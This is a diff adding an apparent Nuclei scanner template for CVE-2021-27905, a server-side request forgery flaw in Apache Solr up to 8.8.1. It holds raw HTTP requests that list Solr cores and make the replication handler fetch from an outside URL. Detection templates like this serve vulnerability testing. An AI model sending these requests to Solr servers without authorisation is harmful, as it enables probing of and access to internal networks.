@@ -1,0 +1,41 @@
+id: CVE-2021-27905
+
+info:
+  name: Apache Solr <= 8.8.1 SSRF
+  author: hackergautam
+  severity: medium
+  tags: cve,cve2021,apache,solr,ssrf
+  description: The ReplicationHandler (normally registered at "/replication" under a Solr core) in Apache Solr has a "masterUrl" (also "leaderUrl" alias) parameter that is used to designate another ReplicationHandler on another Solr core to replicate index data into the local core. To prevent a SSRF vulnerability, Solr ought to check these parameters against a similar configuration it uses for the "shards" parameter. Prior to this bug getting fixed, it did not. This problem affects essentially all Solr versions prior to it getting fixed in 8.8.2.
+  reference: |
+      - https://www.anquanke.com/post/id/238201
+      - https://ubuntu.com/security/CVE-2021-27905
+      - https://nvd.nist.gov/vuln/detail/CVE-2021-27905
+      - https://nsfocusglobal.com/apache-solr-arbitrary-file-read-and-ssrf-vulnerability-threat-alert/
+
+requests:
+  - raw:
+      - |
+        GET /solr/admin/cores?wt=json HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: en
+        Connection: close
+
+      - |
+        GET /solr/{{core}}/replication/?command=fetchindex&masterUrl=https://example.com HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: en
+        Connection: close
+
+    extractors:
+      - type: regex
+        regex:
+          - '"status"\:\{"(.*?)"\:\{"name"'
+        name: core
+        group: 1
+        internal: true
+
+    matchers:
+      - type: word
+        words:
+          - '<str name="status">OK</str>'
+        part: body
